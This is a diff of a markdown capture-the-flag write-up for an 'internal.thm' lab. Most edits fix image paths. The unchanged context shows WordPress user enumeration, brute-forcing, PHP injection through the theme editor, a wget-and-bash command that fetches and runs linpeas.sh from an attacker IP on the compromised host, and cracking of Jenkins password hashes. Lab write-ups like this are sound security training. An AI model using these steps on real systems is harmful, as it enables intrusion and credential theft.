@@ -16,7 +16,7 @@ I then ran a more detailed scan focused on service versions and common scripts:
 
 Port 80 revealed an Apache server:
 
-![haha](./assets/www.png)
+![image](./assets/www.png)
 
 
 ---
@@ -47,7 +47,7 @@ I continued enumeration with **WPScan**, focusing on user discovery:
 
 `wpscan --url http://internal.thm/blog --enumerate u`
 
-![image](wpscan.png)
+![image](./assets/wpscan.png)
 
 After identifying the user `admin`, I launched a brute-force attack:
 
@@ -69,8 +69,9 @@ Inside the WordPress admin panel, I navigated to:
 
 **Appearance → Theme Editor → 404.php**
 
-![image](apparence.png)  
-![image](404.png)
+![image](./assets/apparence.png)
+  
+![image](./assets404.png)
 
 Since the file was editable, it was possible to inject arbitrary PHP code via the theme.
 
@@ -115,6 +116,7 @@ On the compromised host:
 `cd /tmp wget http://<IP>/linpeas.sh bash linpeas.sh`
 
 ![image](./assets/lin21.png) 
+
 ![image](./assets/linex.png)
 
 LinPEAS revealed a **Jenkins** service running inside a Docker container, as well as several sensitive files.
@@ -176,6 +178,7 @@ I navigated into the process directory:
 Inside the `cwd` directory, I found the full Jenkins home structure:
 
 ![image](./assets/cwd.png)
+
 ![image](./assets/ls.png)
 
 From `/var/jenkins_home`, I enumerated sensitive files:
@@ -192,11 +195,13 @@ Including:
     
 
 ![image](./assets/home.png)
+
 ![image](./assets/users.png)
 
 Inside `config.xml`, I extracted a bcrypt password hash:
 
 ![image](./assets/conf.png)
+
 ![image](./assets/password.png)
 
 I cracked it using John the Ripper:
